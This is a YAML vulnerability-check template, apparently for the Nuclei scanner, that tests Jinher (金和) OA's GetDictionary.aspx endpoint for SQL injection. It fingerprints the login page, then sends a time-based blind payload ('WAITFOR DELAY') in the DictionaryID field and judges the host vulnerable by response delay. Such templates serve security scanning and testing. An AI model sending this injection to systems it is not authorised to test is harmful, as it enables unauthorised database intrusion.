id: poc-yaml-jinher-getdictionary-aspx-sqli
info:
  name: 金和OA GetDictionary.aspx SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: '{{rand_int(2, 5)}}'
  t2: '{{to_number(t1) + 2}}'

flow: http(1) && http(2)

http:
  - id: check-login-page
    method: GET
    path:
      - "{{BaseURL}}/C6/Jhsoft.Web.login/PassWordSlideFull.aspx"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "JHSoft"

  - id: sqli-check
    method: POST
    path:
      - "{{BaseURL}}/c6/JHBase.Web.Menu/GetDictionary.aspx/"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "DictionaryID='WAITFOR DELAY'0:0:{{t1}}'--"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - ""
      - type: dsl
        dsl:
          - duration > t1
          - duration < t2
